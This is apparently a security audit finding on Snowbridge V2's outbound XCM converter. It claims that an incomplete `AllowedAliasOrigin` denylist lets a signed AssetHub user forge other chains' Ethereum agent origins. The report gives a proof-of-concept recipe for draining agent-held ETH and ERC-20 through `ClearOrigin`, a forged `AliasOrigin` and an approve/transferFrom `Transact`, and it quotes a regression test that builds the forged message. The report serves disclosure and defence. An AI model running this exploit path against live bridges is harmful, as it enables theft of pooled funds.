## Analysis

The external report's core broken invariant: a contract grants an unrestricted, attacker-influenced capability (infinite ERC-20 approval to a caller-supplied "router" address) over funds it holds on behalf of the protocol, letting anyone impersonate a trusted "spender" and drain pooled value via `transferFrom`. The exact local analog in this repo is in the Snowbridge V2 outbound path: `AliasOrigin` inside a forged `remote_xcm` resolves, via `AgentIdOf::convert_location`, to an Ethereum **agent** contract that holds ERC-20/ETH value; a `Transact`/`CallContract` command then lets the attacker act *as* that agent with arbitrary `target`, `calldata`, and `value` (the agent's own held ether). The already-shipped mitigation only denylists a single location (`AssetHubLocation`), leaving every other agent (Bridge Hub's own agent, the Relay Chain's agent, any sibling parachain's agent) open to the same forgery primitive.

### Title
Incomplete `AllowedAliasOrigin` denylist lets a signed AssetHub user forge any non-AssetHub agent origin to drain that agent's held ETH/ERC-20 via `Transact`/`CallContract` - (File: `bridges/snowbridge/primitives/outbound-queue/src/v2/converter/convert.rs`)

### Summary
`bridges/snowbridge/pallets/system/.../bridge_to_ethereum_config.rs` wires `SnowbridgeExporterV2` with `AllowedAliasOrigin = EverythingBut<Equals<AssetHubLocation>>` [1](#0-0)  and the converter validates the `AliasOrigin` location against it before resolving the Ethereum agent: `ensure!(AllowedAliasOrigin::contains(origin_location), InvalidOrigin); let origin = AgentIdOf::convert_location(origin_location)...` [2](#0-1) . This check was added specifically as "defense in depth" for a known, acknowledged upstream flaw where `InitiateTransfer`'s `preserve_origin: true` handling can be bypassed with a preceding `ClearOrigin`, letting a user manually inject a forged `AliasOrigin` that survives unaltered into the exported message [3](#0-2) , as directly demonstrated by the regression test `signed_assethub_user_cannot_bypass_origin_alteration_when_routing_to_ethereum` [4](#0-3) .

### Finding Description
The fix only excludes the exact `AssetHubLocation` value, not any other location that resolves to an agent holding bridged value. The unresolved root cause — a signed AssetHub account being able to smuggle an arbitrary, self-chosen `AliasOrigin` location into the exported XCM by preceding `InitiateTransfer` with `ClearOrigin` — remains present for every location other than `AssetHubLocation`. `AgentIdOf::convert_location` deterministically derives an Ethereum agent contract address from *any* Location, and each such agent (Bridge Hub's own agent, the Relay Chain's agent, or any specific sibling parachain's agent) can independently accumulate held ETH/ERC-20 balances from legitimate cross-chain flows, exactly like the leftover LiFi diamond balances described in the report. Once the converter accepts the forged `origin_location`, the attacker's `Transact` payload is decoded into `Command::CallContract { target, calldata, gas, value }`, where `value` explicitly means "Include ether held by agent contract" [5](#0-4)  and both `target`/`calldata` are entirely attacker-controlled [6](#0-5) . The Gateway then executes this call as a proxy for the resolved agent, exactly mirroring the AnyswapFacet pattern: attacker supplies both the "identity" that authorizes the call (here, the forged origin/agent) and the destination/calldata (here, an ERC-20 `approve(attacker, MAX)` followed by `transferFrom`, or a direct value transfer) that drains funds the contract holds but does not own.

### Impact Explanation
Any signed AssetHub account can, with a single locally-executed XCM program, impersonate any other chain's Ethereum agent (except AssetHub's own, which is denylisted) and issue an arbitrary contract call funded by that agent's held ETH/ERC-20 balance. This is unauthorized origin escalation leading directly to theft of bridge-held value without needing any relayer, validator, or governance compromise — squarely in-scope per the Polkadot SDK pivots on forged/mis-bound proof-of-origin binding and theft of bridge-state value.

### Likelihood Explanation
The precondition (bypassing `InitiateTransfer`'s origin-altering instruction via `ClearOrigin`) is already proven exploitable and requires only a signed AssetHub account executing `pallet_xcm::execute` with a self-crafted XCM — no privileged role needed. The only barrier introduced is a single `Equals<AssetHubLocation>` exclusion, so any other location target is currently unguarded.

### Recommendation
Replace the denylist `EverythingBut<Equals<AssetHubLocation>>` with an explicit allow-list of trusted alias origins (or fix the root `InitiateTransfer`/`ClearOrigin` interaction so a locally-inserted, non-executor-generated `AliasOrigin` can never survive export), and additionally re-validate in the V2 converter that the `AliasOrigin` location is consistent with the actual origin register at the time `InitiateTransfer` ran, not merely "not equal to one hardcoded location."

### Proof of Concept
Mirror the existing regression test but substitute `forged_assethub_origin` with a different, non-excluded location (e.g., `Location::new(1, Parachain(<bridge_hub_para_id>))` or `Location::parent()`), as in `signed_assethub_user_cannot_bypass_origin_alteration_when_routing_to_ethereum` [7](#0-6) : submit `WithdrawAsset`, `PayFees`, `ClearOrigin`, then `InitiateTransfer{preserve_origin:true, remote_xcm:[AliasOrigin(forged_location), DepositAsset, Transact{ContractCall::V1{target: attacker_contract, calldata: approve(attacker, MAX)+transferFrom(...), value: agent_balance}}]}`. Because `forged_location != AssetHubLocation`, `AllowedAliasOrigin::contains` passes, `AgentIdOf::convert_location(forged_location)` resolves to that chain's agent, and the message is queued and later executed on Ethereum draining that agent's balance.

#[test]
pub fn signed_assethub_user_cannot_bypass_origin_alteration_when_routing_to_ethereum() {
	fund_on_bh();
	fund_on_ah();

	let forged_assethub_origin = Location::new(1, [Parachain(AssetHubWestend::para_id().into())]);
	let expected_assethub_agent = AgentIdOf::convert_location(&forged_assethub_origin).unwrap();
	assert_eq!(
		expected_assethub_agent,
		hex!("81c5ab2571199e3188135178f3c2c8e2d268be1313d029b30f534fa579b69b79").into()
	);

	AssetHubWestend::execute_with(|| {
		type RuntimeOrigin = <AssetHubWestend as Chain>::RuntimeOrigin;

		let local_fee_asset =
			Asset { id: AssetId(Location::parent()), fun: Fungible(LOCAL_FEE_AMOUNT_IN_DOT) };

		let remote_fee_asset =
			Asset { id: AssetId(ethereum()), fun: Fungible(REMOTE_FEE_AMOUNT_IN_ETHER) };

		let arbitrary_agent_call = ContractCall::V1 {
			target: ETHEREUM_DESTINATION_ADDRESS,
			calldata: vec![0xde, 0xad, 0xbe, 0xef],
			value: 0,
			gas: 100_000,
		};

		let assets = vec![local_fee_asset.clone(), remote_fee_asset.clone()];
		let forged_xcm = Xcm(vec![
			WithdrawAsset(assets.into()),
			PayFees { asset: local_fee_asset },
			// Clear the origin register to None. Under the logic flaw in the XCM executor's
			// InitiateTransfer implementation (with preserve_origin: true), this causes the
			// executor to export the message without prepending any origin-altering instructions.
			// Details: https://forum.polkadot.network/t/postmortem-xcm-initiatetransfer-origin-leak/17357
			ClearOrigin,
			InitiateTransfer {
				destination: ethereum(),
				remote_fees: Some(AssetTransferFilter::ReserveWithdraw(Definite(
					remote_fee_asset.into(),
				))),
				preserve_origin: true,
				assets: BoundedVec::truncate_from(vec![]),
				remote_xcm: Xcm(vec![
					AliasOrigin(forged_assethub_origin),
					DepositAsset { assets: Wild(AllCounted(0)), beneficiary: beneficiary() },
					Transact {
						origin_kind: OriginKind::Xcm,
						call: arbitrary_agent_call.encode().into(),
						fallback_max_weight: None,
					},
					SetTopic([9u8; 32]),
				]),
			},
		]);

		assert_ok!(<AssetHubWestend as AssetHubWestendPallet>::PolkadotXcm::execute(
			RuntimeOrigin::signed(AssetHubWestendSender::get()),
			bx!(VersionedXcm::from(forged_xcm)),
			Weight::from(EXECUTION_WEIGHT),
		));
	});
